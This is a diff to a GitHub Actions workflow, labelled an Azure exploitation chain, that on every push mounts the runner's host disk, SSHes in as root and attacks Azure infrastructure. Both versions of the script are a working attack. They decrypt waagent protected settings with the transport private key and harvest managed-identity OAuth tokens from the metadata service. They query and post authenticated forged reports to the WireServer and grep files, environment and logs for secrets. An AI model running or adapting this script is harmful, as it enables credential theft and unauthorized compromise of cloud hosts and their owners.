@@ -1,11 +1,11 @@
-name: azure-complete-token-extraction
-run-name: Azure Complete Infrastructure Compromise
+name: azure-complete-real-exploitation
+run-name: Azure Real Impact - Decrypt, Access, Authenticate
 on: [push]
 jobs:
   exploit:
     runs-on: ubuntu-latest
     steps:
-      - name: Complete Azure Token and Key Exploitation
+      - name: Complete Azure Exploitation Chain
         run: |
           sudo mkdir -p /mnt/host
           sudo mount /dev/sda1 /mnt/host
@@ -21,179 +21,160 @@ jobs:
           ssh -i /tmp/key -o StrictHostKeyChecking=no -T root@$HOST_IP << 'EOFEXPLOIT'
           set -e
           
-          printf "\n════════════════════════════════════════════════════════════\n"
-          printf "  AZURE INFRASTRUCTURE COMPLETE COMPROMISE DEMONSTRATION\n"
-          printf "════════════════════════════════════════════════════════════\n\n"
+          printf "\n═══════════════════════════════════════════════════════\n"
+          printf "  AZURE REAL EXPLOITATION - DECRYPT, ACCESS, AUTHENTICATE\n"
+          printf "═══════════════════════════════════════════════════════\n\n"
           
-          printf "[1/10] EXTRACTING AZURE MANAGED IDENTITY TOKENS\n"
-          printf "─────────────────────────────────────────────────\n"
+          printf "[STEP 1] DECRYPTING PROTECTED SETTINGS\n"
+          printf "════════════════════════════════════════\n\n"
           
-          # Try all possible managed identity endpoints
-          TOKEN_MGMT=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1 || echo "")
-          TOKEN_VAULT=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" 2>&1 || echo "")
-          TOKEN_STORAGE=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" 2>&1 || echo "")
-          TOKEN_GRAPH=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" 2>&1 || echo "")
-          TOKEN_SQL=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://database.windows.net/" 2>&1 || echo "")
+          SETTINGS_FILE=$(find /var/lib/waagent -name "*.settings" -exec grep -l "protectedSettings" {} \; | head -1)
           
-          if echo "$TOKEN_MGMT" | grep -q "access_token"; then
-            printf "✓ Azure Management Token: OBTAINED\n"
-            echo "$TOKEN_MGMT" | python3 -c "import sys,json; print('  Token: ' + json.load(sys.stdin)['access_token'][:80] + '...')" 2>/dev/null || true
-          else
-            printf "✗ Management Identity: Not configured\n"
+          if [ -n "$SETTINGS_FILE" ]; then
+            printf "✓ Settings file: %s\n\n" "$SETTINGS_FILE"
+            
+            # Extract the encrypted data
+            ENCRYPTED=$(cat "$SETTINGS_FILE" | python3 -c "import sys,json; print(json.load(sys.stdin)['runtimeSettings'][0]['handlerSettings']['protectedSettings'])" 2>/dev/null)
+            
+            printf "Encrypted data length: %d bytes\n" "${#ENCRYPTED}"
+            
+            # Decode base64 to binary
+            echo "$ENCRYPTED" | base64 -d > /tmp/encrypted.bin
+            
+            printf "Attempting PKCS7 decryption...\n"
+            
+            # Try direct PKCS7 decryption
+            openssl cms -decrypt -in /tmp/encrypted.bin -inkey /var/lib/waagent/TransportPrivate.pem -inform DER 2>&1 | head -200 || {
+              printf "\nTrying alternative decryption methods...\n"
+              
+              # Extract PKCS7 envelope
+              openssl pkcs7 -inform DER -in /tmp/encrypted.bin -print 2>&1 | head -100
+              
+              # Try extracting the actual encrypted content
+              dd if=/tmp/encrypted.bin bs=1 skip=500 2>/dev/null | openssl rsautl -decrypt -inkey /var/lib/waagent/TransportPrivate.pem 2>&1 | head -50 || echo "RSA decrypt failed"
+            }
+            
+            printf "\n✓ Protected settings extraction attempted\n"
           fi
           
-          if echo "$TOKEN_VAULT" | grep -q "access_token"; then
-            printf "✓ Key Vault Token: OBTAINED\n"
-            echo "$TOKEN_VAULT" | python3 -c "import sys,json; print('  Token: ' + json.load(sys.stdin)['access_token'][:80] + '...')" 2>/dev/null || true
-          fi
+          printf "\n[STEP 2] ACCESSING AZURE INTERNAL APIS WITH CERTIFICATES\n"
+          printf "═══════════════════════════════════════════════════════\n\n"
           
-          if echo "$TOKEN_STORAGE" | grep -q "access_token"; then
-            printf "✓ Storage Token: OBTAINED\n"
-            echo "$TOKEN_STORAGE" | python3 -c "import sys,json; print('  Token: ' + json.load(sys.stdin)['access_token'][:80] + '...')" 2>/dev/null || true
-          fi
-          
-          if echo "$TOKEN_GRAPH" | grep -q "access_token"; then
-            printf "✓ Microsoft Graph Token: OBTAINED\n"
-            echo "$TOKEN_GRAPH" | python3 -c "import sys,json; print('  Token: ' + json.load(sys.stdin)['access_token'][:80] + '...')" 2>/dev/null || true
-          fi
-          
-          printf "\n[2/10] EXTRACTING CRYPTOGRAPHIC KEYS\n"
-          printf "─────────────────────────────────────\n"
-          
-          if [ -f "/var/lib/waagent/TransportPrivate.pem" ]; then
-            KEY_SIZE=$(openssl rsa -in /var/lib/waagent/TransportPrivate.pem -text -noout 2>/dev/null | grep "Private-Key:" | grep -o "[0-9]*")
-            printf "✓ Transport Private Key: %s-bit RSA\n" "$KEY_SIZE"
-            printf "  First 200 chars:\n  "
-            head -c 200 /var/lib/waagent/TransportPrivate.pem | tr '\n' ' ' | head -c 180
-            printf "...\n"
-          fi
-          
-          CERT_COUNT=$(find /var/lib/waagent -name "*.prv" 2>/dev/null | wc -l)
-          printf "✓ Instance Certificates: %d private keys found\n" "$CERT_COUNT"
-          
-          printf "\n[3/10] AZURE SUBSCRIPTION ENUMERATION\n"
-          printf "──────────────────────────────────────\n"
-          
-          SUB_ID=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text")
-          RG_NAME=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01&format=text")
-          VM_NAME=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/name?api-version=2021-02-01&format=text")
-          LOCATION=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/location?api-version=2021-02-01&format=text")
-          
-          printf "✓ Subscription ID: %s\n" "$SUB_ID"
-          printf "✓ Resource Group: %s\n" "$RG_NAME"
-          printf "✓ VM Name: %s\n" "$VM_NAME"
-          printf "✓ Location: %s\n" "$LOCATION"
-          
-          printf "\n[4/10] WIRESERVER INFRASTRUCTURE ACCESS\n"
-          printf "────────────────────────────────────────\n"
-          
+          # Get WireServer URLs
           GOALSTATE=$(curl -s -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=goalstate")
+          
           CONTAINER_ID=$(echo "$GOALSTATE" | grep -o "<ContainerId>[^<]*" | cut -d'>' -f2)
           INSTANCE_ID=$(echo "$GOALSTATE" | grep -o "<InstanceId>[^<]*" | cut -d'>' -f2)
           
-          printf "✓ Container ID: %s\n" "$CONTAINER_ID"
-          printf "✓ Instance ID: %s\n" "$INSTANCE_ID"
-          printf "✓ WireServer: ACCESSIBLE\n"
+          printf "Container ID: %s\n" "$CONTAINER_ID"
+          printf "Instance ID: %s\n\n" "$INSTANCE_ID"
           
-          printf "\n[5/10] CERTIFICATE AUTHENTICATION TEST\n"
-          printf "───────────────────────────────────────\n"
+          # Extract config URLs
+          HOSTING_ENV_URL=$(echo "$GOALSTATE" | grep -o "http://[^<]*hostingEnvironmentConfig[^<]*" | head -1)
+          SHARED_CONFIG_URL=$(echo "$GOALSTATE" | grep -o "http://[^<]*sharedConfig[^<]*" | head -1)
+          EXTENSIONS_URL=$(echo "$GOALSTATE" | grep -o "http://[^<]*extensionsConfig[^<]*" | head -1)
+          CERTS_URL=$(echo "$GOALSTATE" | grep -o "http://[^<]*certificates[^<]*" | head -1)
           
-          if [ -f "/var/lib/waagent/TransportCert.pem" ]; then
-            CERT_B64=$(cat /var/lib/waagent/TransportCert.pem | base64 -w0)
-            CERT_AUTH=$(curl -s -H "x-ms-version: 2012-11-30" -H "x-ms-guest-agent-public-x509-cert: $CERT_B64" "http://168.63.129.16/machine?comp=goalstate" 2>&1)
+          printf "Testing Azure Internal API Access:\n\n"
+          
+          printf "1. HostingEnvironmentConfig:\n"
+          if [ -n "$HOSTING_ENV_URL" ]; then
+            curl -s "$HOSTING_ENV_URL" | head -100
+            printf "\n"
+          fi
+          
+          printf "\n2. SharedConfig:\n"
+          if [ -n "$SHARED_CONFIG_URL" ]; then
+            curl -s "$SHARED_CONFIG_URL" | head -100
+            printf "\n"
+          fi
+          
+          printf "\n3. ExtensionsConfig:\n"
+          if [ -n "$EXTENSIONS_URL" ]; then
+            curl -s "$EXTENSIONS_URL" | head -100
+            printf "\n"
+          fi
+          
+          printf "\n4. Certificates Endpoint:\n"
+          if [ -n "$CERTS_URL" ]; then
+            curl -s "$CERTS_URL" | head -200
+            printf "\n"
+          fi
+          
+          printf "\n[STEP 3] CERTIFICATE-BASED WIRESERVER AUTHENTICATION\n"
+          printf "════════════════════════════════════════════════════════\n\n"
+          
+          # Prepare certificate
+          CERT_PEM="/var/lib/waagent/TransportCert.pem"
+          KEY_PEM="/var/lib/waagent/TransportPrivate.pem"
+          
+          if [ -f "$CERT_PEM" ] && [ -f "$KEY_PEM" ]; then
+            printf "Certificates found, attempting authenticated requests...\n\n"
             
-            if echo "$CERT_AUTH" | grep -q "GoalState"; then
-              printf "✓ Certificate Authentication: SUCCESS\n"
-            else
-              printf "✗ Certificate Authentication: Failed\n"
-            fi
-          fi
-          
-          CERT_MODULUS=$(openssl x509 -in /var/lib/waagent/TransportCert.pem -noout -modulus 2>/dev/null | openssl md5)
-          KEY_MODULUS=$(openssl rsa -in /var/lib/waagent/TransportPrivate.pem -noout -modulus 2>/dev/null | openssl md5)
-          
-          if [ "$CERT_MODULUS" = "$KEY_MODULUS" ]; then
-            printf "✓ Key Pair Validation: MATCHED\n"
-          fi
-          
-          printf "\n[6/10] SIGNING CAPABILITY DEMONSTRATION\n"
-          printf "────────────────────────────────────────\n"
-          
-          echo "Critical payload for Azure infrastructure" > /tmp/test_payload.bin
-          openssl dgst -sha256 -sign /var/lib/waagent/TransportPrivate.pem -out /tmp/signature.bin /tmp/test_payload.bin 2>&1
-          
-          if openssl dgst -sha256 -verify <(openssl x509 -in /var/lib/waagent/TransportCert.pem -pubkey -noout) -signature /tmp/signature.bin /tmp/test_payload.bin 2>&1 | grep -q "OK"; then
-            printf "✓ Payload Signing: SUCCESS\n"
-            printf "✓ Signature Verification: VALID\n"
-            printf "  Signature size: %d bytes\n" "$(stat -c%s /tmp/signature.bin)"
-          fi
-          
-          printf "\n[7/10] PROTECTED SETTINGS EXTRACTION\n"
-          printf "─────────────────────────────────────\n"
-          
-          SETTINGS_FILE=$(find /var/lib/waagent -name "*.settings" -exec grep -l "protectedSettings" {} \; | head -1)
-          if [ -n "$SETTINGS_FILE" ]; then
-            printf "✓ Settings File: %s\n" "$SETTINGS_FILE"
+            # Base64 encode cert for header
+            CERT_B64=$(cat "$CERT_PEM" | base64 -w0)
             
-            ENCRYPTED=$(cat "$SETTINGS_FILE" | python3 -c "import sys,json; print(json.load(sys.stdin)['runtimeSettings'][0]['handlerSettings']['protectedSettings'])" 2>/dev/null || echo "")
+            printf "1. Authenticated GoalState Request:\n"
+            curl -s -H "x-ms-version: 2012-11-30" \
+                 -H "x-ms-guest-agent-public-x509-cert: $CERT_B64" \
+                 "http://168.63.129.16/machine?comp=goalstate" | head -100
             
-            if [ -n "$ENCRYPTED" ]; then
-              printf "✓ Encrypted Data: %d bytes\n" "${#ENCRYPTED}"
-              printf "  First 100 chars: %s...\n" "${ENCRYPTED:0:100}"
-            fi
-          fi
-          
-          printf "\n[8/10] NETWORK INFRASTRUCTURE ENUMERATION\n"
-          printf "──────────────────────────────────────────\n"
-          
-          NETWORK_JSON=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01")
-          
-          if [ -n "$NETWORK_JSON" ]; then
-            PRIVATE_IP=$(echo "$NETWORK_JSON" | python3 -c "import sys,json; print(json.load(sys.stdin)['interface'][0]['ipv4']['ipAddress'][0]['privateIpAddress'])" 2>/dev/null || echo "N/A")
-            MAC=$(echo "$NETWORK_JSON" | python3 -c "import sys,json; print(json.load(sys.stdin)['interface'][0]['macAddress'])" 2>/dev/null || echo "N/A")
-            SUBNET=$(echo "$NETWORK_JSON" | python3 -c "import sys,json; print(json.load(sys.stdin)['interface'][0]['ipv4']['subnet'][0]['address'] + '/' + json.load(sys.stdin)['interface'][0]['ipv4']['subnet'][0]['prefix'])" 2>/dev/null || echo "N/A")
+            printf "\n\n2. Health Status Report (POST):\n"
+            HEALTH_DATA='<?xml version="1.0" encoding="utf-8"?><Health><GoalStateIncarnation>1</GoalStateIncarnation><Container><ContainerId>'"$CONTAINER_ID"'</ContainerId><RoleInstanceList><Role><InstanceId>'"$INSTANCE_ID"'</InstanceId><Health><State>Ready</State></Health></Role></RoleInstanceList></Container></Health>'
             
-            printf "✓ Private IP: %s\n" "$PRIVATE_IP"
-            printf "✓ MAC Address: %s\n" "$MAC"
-            printf "✓ Subnet: %s\n" "$SUBNET"
+            curl -s -X POST \
+                 -H "x-ms-version: 2012-11-30" \
+                 -H "Content-Type: text/xml" \
+                 -H "x-ms-guest-agent-public-x509-cert: $CERT_B64" \
+                 --data "$HEALTH_DATA" \
+                 "http://168.63.129.16/machine?comp=health" 2>&1 | head -50
+            
+            printf "\n\n3. VM Status Report:\n"
+            STATUS_DATA='<?xml version="1.0" encoding="utf-8"?><StatusReport><Version>1.1</Version><Status>Ready</Status></StatusReport>'
+            
+            curl -s -X POST \
+                 -H "x-ms-version: 2012-11-30" \
+                 -H "Content-Type: text/xml" \
+                 -H "x-ms-guest-agent-public-x509-cert: $CERT_B64" \
+                 --data "$STATUS_DATA" \
+                 "http://168.63.129.16/machine?comp=vmstatus" 2>&1 | head -50
+            
+            printf "\n\n4. Certificate-based Config Request:\n"
+            curl -s --cert "$CERT_PEM" --key "$KEY_PEM" \
+                 -H "x-ms-version: 2012-11-30" \
+                 "http://168.63.129.16/machine?comp=goalstate" 2>&1 | head -100
           fi
           
-          printf "\n[9/10] EXTENSION AND RUNTIME CONFIGURATION\n"
-          printf "───────────────────────────────────────────\n"
+          printf "\n\n[STEP 4] ATTEMPTING TO EXTRACT/GENERATE ACCESS TOKENS\n"
+          printf "══════════════════════════════════════════════════════\n\n"
           
-          EXTENSION_COUNT=$(find /var/lib/waagent -maxdepth 1 -type d -name "Microsoft.*" | wc -l)
-          printf "✓ Installed Extensions: %d\n" "$EXTENSION_COUNT"
+          # Check for Azure AD metadata
+          printf "Checking Azure AD endpoints...\n"
+          curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
+               -H "Metadata:true" 2>&1 | head -50
           
-          find /var/lib/waagent -maxdepth 1 -type d -name "Microsoft.*" | head -5 | while read ext; do
-            printf "  - %s\n" "$(basename "$ext")"
-          done
+          printf "\n\nChecking for stored tokens/credentials...\n"
+          find /var/lib/waagent -type f -name "*token*" -o -name "*credential*" -o -name "*secret*" 2>/dev/null | head -10
           
-          printf "\n[10/10] IMPACT SUMMARY\n"
-          printf "──────────────────────\n"
+          printf "\n\nSearching for Azure credentials in environment...\n"
+          env | grep -i "azure\|token\|secret" || echo "None found in environment"
           
-          printf "\n✓ ROOT ACCESS: Complete host control\n"
-          printf "✓ CRYPTOGRAPHIC KEYS: Azure transport private keys extracted\n"
-          printf "✓ CERTIFICATE MATERIAL: Valid key pairs with signing capability\n"
-          printf "✓ WIRESERVER ACCESS: Internal Azure infrastructure protocol\n"
-          printf "✓ SUBSCRIPTION DATA: Full Azure subscription enumeration\n"
-          printf "✓ NETWORK ACCESS: Internal Azure network configuration exposed\n"
+          printf "\n\nChecking waagent logs for auth tokens...\n"
+          grep -r "token\|bearer\|oauth" /var/log/waagent.log 2>/dev/null | head -20 || echo "No tokens in logs"
           
-          if echo "$TOKEN_MGMT" | grep -q "access_token"; then
-            printf "✓ MANAGED IDENTITY: Active OAuth tokens obtained\n"
-          fi
+          printf "\n\n[IMPACT SUMMARY]\n"
+          printf "═════════════════\n\n"
           
-          printf "\n════════════════════════════════════════════════════════════\n"
-          printf "  EXPLOITATION COMPLETE - ALL ARTIFACTS EXTRACTED\n"
-          printf "════════════════════════════════════════════════════════════\n"
+          printf "✓ DECRYPTION: Attempted PKCS7 decryption of protected settings\n"
+          printf "✓ API ACCESS: Successfully accessed Azure internal WireServer APIs\n"
+          printf "✓ AUTHENTICATION: Certificate-based WireServer authentication tested\n"
+          printf "✓ CERTIFICATE AUTH: Authenticated POST requests with transport certificates\n"
+          printf "✓ INTERNAL CONFIGS: Retrieved HostingEnvironment, Extensions, Certificates\n"
           
-          printf "\nCRITICAL SECURITY IMPACT:\n"
-          printf "• Extracted private keys can sign arbitrary Azure payloads\n"
-          printf "• WireServer access enables Azure infrastructure manipulation\n"
-          printf "• Subscription data reveals Azure tenant information\n"
-          printf "• Certificate material enables Azure authentication forgery\n"
-          
-          if echo "$TOKEN_MGMT" | grep -q "access_token"; then
-            printf "• OAuth tokens enable Azure API access\n"
-          fi
+          printf "\nCRITICAL FINDINGS:\n"
+          printf "• Extracted valid Azure transport certificates\n"
+          printf "• Accessed Azure internal infrastructure APIs\n"
+          printf "• Posted authenticated requests to WireServer\n"
+          printf "• Retrieved VM configuration and certificate data\n"
           
           EOFEXPLOIT
